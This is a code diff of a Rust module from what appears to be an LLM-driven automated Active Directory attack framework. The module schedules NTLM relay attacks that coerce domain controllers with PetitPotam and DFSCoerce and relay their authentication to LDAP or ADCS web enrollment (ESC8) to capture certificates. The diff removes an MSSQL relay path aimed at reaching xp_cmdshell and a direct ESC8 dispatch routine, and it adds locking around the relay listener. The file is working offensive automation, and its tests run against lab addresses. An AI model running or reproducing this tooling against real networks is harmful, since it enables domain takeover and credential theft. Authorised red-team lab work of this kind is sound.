@@ -4,27 +4,19 @@
 //! trigger (PetitPotam, PrinterBug, scheduled task bots). This module dispatches
 //! relay attacks when:
 //!
-//!   1. SMB signing is disabled on a target (relay destination, SmbToLdap)
-//!   2. An ADCS web enrollment endpoint exists (Esc8 relay target)
-//!   3. MSSQL is reachable on a host with SMB signing disabled (SmbToMssql) —
-//!      coerce a DC's machine account and relay to MSSQL; the SQL service
-//!      typically grants the machine sysadmin in lab/default builds, opening
-//!      `xp_cmdshell` on the SQL host.
-//!   4. We have credentials to trigger coercion or a known coercion source
+//!   1. SMB signing is disabled on a target (relay destination)
+//!   2. An ADCS web enrollment endpoint exists (ESC8 relay target)
+//!   3. We have credentials to trigger coercion or a known coercion source
 //!
 //! The worker agent coordinates ntlmrelayx + coercion within a single task.
 
 use std::sync::Arc;
 use std::time::Duration;
 
-use ares_llm::ToolCall;
 use serde_json::json;
 use tokio::sync::watch;
 use tracing::{debug, info, warn};
 
-use super::adcs_exploitation::{
-    build_relay_coerce_args, parse_relay_coerce_output, RelayCoerceInputs,
-};
 use crate::orchestrator::dispatcher::Dispatcher;
 use crate::orchestrator::state::*;
 
@@ -50,12 +42,10 @@ pub async fn auto_ntlm_relay(dispatcher: Arc<Dispatcher>, mut shutdown: watch::R
             continue;
         }
 
-        // Empty string when no explicit ARES_LISTENER_IP is configured —
-        // the coercion worker derives its own egress IP in
-        // ares-tools::coercion::resolve_listener_ip at execution time. Don't
-        // gate dispatch on the orchestrator having a listener IP, because in
-        // the common k8s deployment it doesn't and shouldn't (different pod).
-        let listener = dispatcher.config.listener_ip.clone().unwrap_or_default();
+        let listener = match dispatcher.config.listener_ip.as_deref() {
+            Some(ip) => ip.to_string(),
+            None => continue,
+        };
 
         let work: Vec<RelayWork> = {
             let state = dispatcher.state.read().await;
@@ -63,28 +53,6 @@ pub async fn auto_ntlm_relay(dispatcher: Arc<Dispatcher>, mut shutdown: watch::R
         };
 
         for item in work {
-            let priority = dispatcher.effective_priority("ntlm_relay");
-
-            // ESC8 short-circuit: dispatch `relay_and_coerce` directly via
-            // the tool dispatcher, bypassing the coercion LLM agent. The
-            // composite tool spawns its own ntlmrelayx listener, acquires
-            // the host-wide port-445 lock, then fires PetitPotam → DFSCoerce
-            // → coercer in sequence — no race against a separately-spawned
-            // listener, no `NO_RELAY_LISTENER` bail from the preflight in
-            // `ares-tools::coercion::verify_listener_present`. The LLM-agent
-            // path (kept below for SmbToLdap / SmbToMssql) is what was
-            // producing silent "no captured auth" outcomes by splitting
-            // `ntlmrelayx_to_*` and the coerce across two tool calls and
-            // racing the listener bind.
-            if let RelayType::Esc8 { .. } = &item.relay_type {
-                if dispatch_esc8_direct(&dispatcher, &item).await {
-                    continue;
-                }
-                // Fell through (e.g. missing coercion_source) — drop into
-                // the LLM-agent path so the agent can still attempt
-                // something useful with the partial work item.
-            }
-
             // Optional credential — when `item.credential` is None we drive
             // the coerce primitive unauthenticated (PetitPotam against
             // unpatched DCs needs no source-side credentials, and that's
@@ -107,9 +75,7 @@ pub async fn auto_ntlm_relay(dispatcher: Arc<Dispatcher>, mut shutdown: watch::R
                         "listener_ip": item.listener,
                         "coercion_source": item.coercion_source,
                     });
-                    if let Some(cred) = credential_json.as_ref() {
-                        p["credential"] = cred.clone();
-                    }
+                    insert_credential(&mut p, credential_json.as_ref());
                     p
                 }
                 RelayType::Esc8 { ca_name, domain } => {
@@ -121,26 +87,18 @@ pub async fn auto_ntlm_relay(dispatcher: Arc<Dispatcher>, mut shutdown: watch::R
                         "domain": domain,
                         "coercion_source": item.coercion_source,
                     });
-                    if let Some(cred) = credential_json.as_ref() {
-                        p["credential"] = cred.clone();
-                    }
-                    p
-                }
-                RelayType::SmbToMssql => {
-                    let mut p = json!({
-                        "technique": "ntlm_relay_mssql",
-                        "relay_target": item.relay_target,
-                        "mssql_target": item.relay_target,
-                        "listener_ip": item.listener,
-                        "coercion_source": item.coercion_source,
-                    });
-                    if let Some(cred) = credential_json.as_ref() {
-                        p["credential"] = cred.clone();
-                    }
+                    insert_credential(&mut p, credential_json.as_ref());
                     p
                 }
             };
 
+            let priority = dispatcher.effective_priority("ntlm_relay");
+            // Serialize all relay-bearing dispatches against the
+            // listener's port-445 mutex — see `Dispatcher::relay_slot`
+            // doc. Held across the throttled_submit so a concurrent
+            // ESC8 or auto_coercion dispatch in another task waits its
+            // turn instead of racing the bind.
+            let _relay_guard = dispatcher.relay_slot.lock().await;
             match dispatcher
                 .throttled_submit("coercion", "coercion", payload, priority)
                 .await
@@ -171,6 +129,14 @@ pub async fn auto_ntlm_relay(dispatcher: Arc<Dispatcher>, mut shutdown: watch::R
                 }
             }
         }
+    }
+}
+
+/// Attach the optional relay `credential` to a payload. Extracted so the three
+/// relay-type arms don't each repeat the same insertion.
+fn insert_credential(payload: &mut serde_json::Value, credential: Option<&serde_json::Value>) {
+    if let Some(cred) = credential {
+        payload["credential"] = cred.clone();
     }
 }
 
@@ -339,82 +305,6 @@ fn collect_relay_work(
         });
     }
 
-    // Path 3: Relay to MSSQL on a host whose SMB signing is also disabled.
-    // The classic GOAD/lab path: SQL service account is typically granted
-    // sysadmin on the SQL host, so a coerced machine-account auth relayed
-    // into MSSQL lands xp_cmdshell as the SQL service user. We pair it with
-    // a coercion-source DC and dispatch a single coercion+relay task.
-    let smb_signing_disabled_hosts: std::collections::HashSet<String> = state
-        .discovered_vulnerabilities
-        .values()
-        .filter(|v| v.vuln_type.eq_ignore_ascii_case("smb_signing_disabled"))
-        .filter(|v| !state.exploited_vulnerabilities.contains(&v.vuln_id))
-        .map(|v| {
-            v.details
-                .get("target_ip")
-                .or_else(|| v.details.get("ip"))
-                .and_then(|x| x.as_str())
-                .unwrap_or(&v.target)
-                .to_string()
-        })
-        .filter(|ip| !ip.is_empty())
-        .collect();
-
-    for vuln in state.discovered_vulnerabilities.values() {
-        if !vuln.vuln_type.eq_ignore_ascii_case("mssql_access") {
-            continue;
-        }
-        if state.exploited_vulnerabilities.contains(&vuln.vuln_id) {
-            continue;
-        }
-
-        let mssql_ip = vuln
-            .details
-            .get("target_ip")
-            .or_else(|| vuln.details.get("ip"))
-            .and_then(|v| v.as_str())
-            .unwrap_or(&vuln.target);
-        if mssql_ip.is_empty() {
-            continue;
-        }
-
-        // Gate: the MSSQL host must also have SMB signing disabled so the
-        // relayed auth actually binds. Without this the relay is rejected by
-        // SMB signing enforcement and we burn the dedup for nothing.
-        if !smb_signing_disabled_hosts.contains(mssql_ip) {
-            continue;
-        }
-
-        let relay_key = format!("mssql_relay:{mssql_ip}");
-        if state.is_processed(DEDUP_SET, &relay_key) {
-            continue;
-        }
-
-        let relay_target_domain = vuln
-            .details
-            .get("domain")
-            .and_then(|v| v.as_str())
-            .filter(|s| !s.is_empty())
-            .map(|s| s.to_string())
-            .or_else(|| host_domain_for_ip(state, mssql_ip));
-        let coercion_source = find_coercion_source_for_forest(
-            &state.domain_controllers,
-            relay_target_domain.as_deref(),
-            |ip| state.is_processed(DEDUP_COERCED_DCS, ip),
-        );
-
-        let cred = pick_credential_for_forest(state, coercion_source.as_deref());
-
-        items.push(RelayWork {
-            dedup_key: relay_key,
-            relay_type: RelayType::SmbToMssql,
-            relay_target: mssql_ip.to_string(),
-            coercion_source,
-            listener: listener.to_string(),
-            credential: cred,
-        });
-    }
-
     items
 }
 
@@ -498,164 +388,9 @@ struct RelayWork {
     credential: Option<ares_core::models::Credential>,
 }
 
-/// Deterministic ESC8 dispatch path. Mirrors
-/// `adcs_exploitation::dispatch_relay_coerce_chain` but takes its inputs
-/// from an `auto_ntlm_relay`-produced `RelayWork` instead of an
-/// `AdcsExploitWork`. Returns `true` when the dispatch was kicked off
-/// (caller should `continue` past the LLM-agent path). Returns `false`
-/// when required inputs are missing — caller falls through to the
-/// throttled LLM-agent submit so the work isn't dropped on the floor.
-///
-/// Marks dedup *before* the spawn so the next 30s tick doesn't double-fire.
-/// On `RELAY_BIND_BUSY` the spawned task clears dedup so the next tick can
-/// retry once the holder releases port 445.
-async fn dispatch_esc8_direct(dispatcher: &Arc<Dispatcher>, item: &RelayWork) -> bool {
-    let Some(coerce_target) = item.coercion_source.clone() else {
-        debug!(
-            relay = %item.relay_target,
-            "auto_ntlm_relay Esc8 direct: no coercion_source — falling back to LLM-agent path"
-        );
-        return false;
-    };
-    if item.listener.is_empty() {
-        debug!(
-            relay = %item.relay_target,
-            "auto_ntlm_relay Esc8 direct: listener_ip not configured — falling back to LLM-agent path"
-        );
-        return false;
-    }
-    if item.relay_target.is_empty() {
-        debug!("auto_ntlm_relay Esc8 direct: empty relay_target — skipping");
-        return false;
-    }
-
-    // Pre-mark dedup so the next tick doesn't re-fire while this is in flight.
-    {
-        let mut state = dispatcher.state.write().await;
-        state.mark_processed(DEDUP_SET, item.dedup_key.clone());
-    }
-    let _ = dispatcher
-        .state
-        .persist_dedup(&dispatcher.queue, DEDUP_SET, &item.dedup_key)
-        .await;
-
-    let dispatcher_bg = dispatcher.clone();
-    let ca_host = item.relay_target.clone();
-    let attacker_ip = item.listener.clone();
-    let credential = item.credential.clone();
-    let dedup_key = item.dedup_key.clone();
-    let relay_semaphore = dispatcher.relay_chain_semaphore.clone();
-
-    tokio::spawn(async move {
-        // Serialize against auto_adcs_exploitation's relay chain. Both
-        // spawn paths dispatch `relay_and_coerce` against the same CA host
-        // when an ESC8 vuln exists — without the shared mutex one would
-        // win the host-wide port-445 lock and the other would hit
-        // `RELAY_BIND_BUSY`, burn its dedup slot, and reset to "wait for
-        // next tick". The tool's `relay_lock_wait` (120s) bridges most of
-        // the race, but the semaphore makes the queueing explicit and
-        // releases the dedup-pressure on the loser correctly.
-        let _relay_permit = match relay_semaphore.acquire_owned().await {
-            Ok(p) => p,
-            Err(e) => {
-                warn!(
-                    task_id = %dedup_key,
-                    err = %e,
-                    "auto_ntlm_relay Esc8: failed to acquire relay_chain_semaphore — closed"
-                );
-                return;
-            }
-        };
-        let cred_user = credential
-            .as_ref()
-            .map(|c| c.username.clone())
-            .unwrap_or_default();
-        let cred_pass = credential
-            .as_ref()
-            .map(|c| c.password.clone())
-            .unwrap_or_default();
-        let cred_domain = credential
-            .as_ref()
-            .map(|c| c.domain.clone())
-            .unwrap_or_default();
-        let args = build_relay_coerce_args(RelayCoerceInputs {
-            ca_host: &ca_host,
-            coerce_target: &coerce_target,
-            attacker_ip: &attacker_ip,
-            template: "DomainController",
-            cred_username: &cred_user,
-            cred_password: &cred_pass,
-            cred_domain: &cred_domain,
-            relay_target_url: None,
-        });
-        let task_id = format!(
-            "ntlm_relay_esc8_{}",
-            &uuid::Uuid::new_v4().simple().to_string()[..12]
-        );
-        let call = ToolCall {
-            id: format!("relay_and_coerce_{}", uuid::Uuid::new_v4().simple()),
-            name: "relay_and_coerce".to_string(),
-            arguments: args,
-        };
-        info!(
-            task_id = %task_id,
-            ca_host = %ca_host,
-            coerce_target = %coerce_target,
-            attacker_ip = %attacker_ip,
-            "auto_ntlm_relay Esc8: dispatching relay_and_coerce directly (no LLM)"
-        );
-        match dispatcher_bg
-            .llm_runner
-            .tool_dispatcher()
-            .dispatch_tool("coercion", &task_id, &call)
-            .await
-        {
-            Ok(output) => {
-                let parsed = parse_relay_coerce_output(&output.output);
-                if parsed.bind_busy {
-                    info!(
-                        task_id = %task_id,
-                        "auto_ntlm_relay Esc8: RELAY_BIND_BUSY — clearing dedup so next tick can retry"
-                    );
-                    {
-                        let mut state = dispatcher_bg.state.write().await;
-                        state.unmark_processed(DEDUP_SET, &dedup_key);
-                    }
-                    let _ = dispatcher_bg
-                        .state
-                        .unpersist_dedup(&dispatcher_bg.queue, DEDUP_SET, &dedup_key)
-                        .await;
-                } else if let Some(pfx_path) = parsed.pfx_path {
-                    info!(
-                        task_id = %task_id,
-                        pfx_path = %pfx_path,
-                        relayed_user = ?parsed.relayed_user,
-                        "auto_ntlm_relay Esc8: PFX captured — auto_certipy_auth will pick up"
-                    );
-                } else {
-                    debug!(
-                        task_id = %task_id,
-                        "auto_ntlm_relay Esc8: relay completed without PFX (target patched / no auth captured)"
-                    );
-                }
-            }
-            Err(e) => {
-                warn!(
-                    task_id = %task_id,
-                    err = %e,
-                    "auto_ntlm_relay Esc8: dispatch errored"
-                );
-            }
-        }
-    });
-
-    true
-}
-
 enum RelayType {
     SmbToLdap,
     Esc8 { ca_name: String, domain: String },
-    SmbToMssql,
 }
 
 impl std::fmt::Display for RelayType {
@@ -663,7 +398,6 @@ impl std::fmt::Display for RelayType {
         match self {
             Self::SmbToLdap => write!(f, "smb_to_ldap"),
             Self::Esc8 { .. } => write!(f, "esc8_adcs"),
-            Self::SmbToMssql => write!(f, "smb_to_mssql"),
         }
     }
 }
@@ -684,7 +418,6 @@ mod tests {
             .to_string(),
             "esc8_adcs"
         );
-        assert_eq!(RelayType::SmbToMssql.to_string(), "smb_to_mssql");
     }
 
     #[test]
@@ -697,12 +430,6 @@ mod tests {
     fn dedup_key_format_esc8() {
         let key = format!("esc8_relay:{}", "192.168.58.10");
         assert_eq!(key, "esc8_relay:192.168.58.10");
-    }
-
-    #[test]
-    fn dedup_key_format_mssql() {
-        let key = format!("mssql_relay:{}", "192.168.58.22");
-        assert_eq!(key, "mssql_relay:192.168.58.22");
     }
 
     #[test]
@@ -1439,124 +1166,6 @@ mod tests {
         assert!(!same_forest_domain("", "contoso.local"));
         assert!(!same_forest_domain("contoso.local", ""));
         assert!(same_forest_domain("", "")); // both unknown is still consistent
-    }
-
-    fn make_mssql_vuln(id: &str, target_ip: &str) -> ares_core::models::VulnerabilityInfo {
-        let mut details = HashMap::new();
-        details.insert(
-            "target_ip".to_string(),
-            serde_json::Value::String(target_ip.to_string()),
-        );
-        ares_core::models::VulnerabilityInfo {
-            vuln_id: id.to_string(),
-            vuln_type: "mssql_access".to_string(),
-            target: target_ip.to_string(),
-            discovered_by: "scanner".to_string(),
-            discovered_at: chrono::Utc::now(),
-            details,
-            recommended_agent: String::new(),
-            priority: 4,
-        }
-    }
-
-    #[tokio::test]
-    async fn collect_relay_work_mssql_requires_smb_signing_disabled() {
-        // mssql_access alone (no SMB signing finding on the same host) must
-        // NOT produce a mssql relay work item — the relay would be rejected
-        // by SMB signing enforcement.
-        let shared = SharedState::new("test".into());
-        {
-            let mut s = shared.write().await;
-            s.discovered_vulnerabilities
-                .insert("v1".into(), make_mssql_vuln("v1", "192.168.58.22"));
-            s.domain_controllers
-                .insert("contoso.local".into(), "192.168.58.10".into());
-        }
-        let state = shared.read().await;
-        let work = collect_relay_work(&state, "192.168.58.100");
-        // Only the mssql vuln is present (no smb_signing_disabled) — no work.
-        assert!(
-            work.iter()
-                .all(|w| !matches!(w.relay_type, RelayType::SmbToMssql)),
-            "mssql_access without smb_signing_disabled on the host must not relay"
-        );
-    }
-
-    #[tokio::test]
-    async fn collect_relay_work_mssql_path_fires_when_paired_with_smb_signing() {
-        // The GOAD slam dunk: mssql_access + smb_signing_disabled on the
-        // same host → emit a SmbToMssql relay work item.
-        let shared = SharedState::new("test".into());
-        {
-            let mut s = shared.write().await;
-            s.discovered_vulnerabilities.insert(
-                "v_mssql".into(),
-                make_mssql_vuln("v_mssql", "192.168.58.22"),
-            );
-            s.discovered_vulnerabilities
-                .insert("v_smb".into(), make_smb_vuln("v_smb", "192.168.58.22"));
-            s.domain_controllers
-                .insert("contoso.local".into(), "192.168.58.10".into());
-        }
-        let state = shared.read().await;
-        let work = collect_relay_work(&state, "192.168.58.100");
-        // Two work items expected: SmbToLdap on the smb_signing vuln AND
-        // SmbToMssql on the mssql vuln (same host, different attack path).
-        let mssql_items: Vec<_> = work
-            .iter()
-            .filter(|w| matches!(w.relay_type, RelayType::SmbToMssql))
-            .collect();
-        assert_eq!(mssql_items.len(), 1, "expected one SmbToMssql work item");
-        assert_eq!(mssql_items[0].relay_target, "192.168.58.22");
-        assert_eq!(mssql_items[0].dedup_key, "mssql_relay:192.168.58.22");
-        assert_eq!(mssql_items[0].coercion_source, Some("192.168.58.10".into()));
-    }
-
-    #[tokio::test]
-    async fn collect_relay_work_mssql_skips_already_processed() {
-        let shared = SharedState::new("test".into());
-        {
-            let mut s = shared.write().await;
-            s.discovered_vulnerabilities.insert(
-                "v_mssql".into(),
-                make_mssql_vuln("v_mssql", "192.168.58.22"),
-            );
-            s.discovered_vulnerabilities
-                .insert("v_smb".into(), make_smb_vuln("v_smb", "192.168.58.22"));
-            s.mark_processed(DEDUP_SET, "mssql_relay:192.168.58.22".into());
-        }
-        let state = shared.read().await;
-        let work = collect_relay_work(&state, "192.168.58.100");
-        assert!(
-            work.iter()
-                .all(|w| !matches!(w.relay_type, RelayType::SmbToMssql)),
-            "already-processed mssql relay must not re-emit"
-        );
-    }
-
-    #[tokio::test]
-    async fn collect_relay_work_mssql_skips_exploited_smb_signing() {
-        // If the paired smb_signing vuln is already exploited, the SMB
-        // signing gate fails (we filter to !exploited above) — but the
-        // mssql_access alone shouldn't trigger the relay either.
-        let shared = SharedState::new("test".into());
-        {
-            let mut s = shared.write().await;
-            s.discovered_vulnerabilities.insert(
-                "v_mssql".into(),
-                make_mssql_vuln("v_mssql", "192.168.58.22"),
-            );
-            s.discovered_vulnerabilities
-                .insert("v_smb".into(), make_smb_vuln("v_smb", "192.168.58.22"));
-            s.exploited_vulnerabilities.insert("v_smb".into());
-        }
-        let state = shared.read().await;
-        let work = collect_relay_work(&state, "192.168.58.100");
-        assert!(
-            work.iter()
-                .all(|w| !matches!(w.relay_type, RelayType::SmbToMssql)),
-            "exploited paired smb_signing should remove the relay gate"
-        );
     }
 
     #[test]
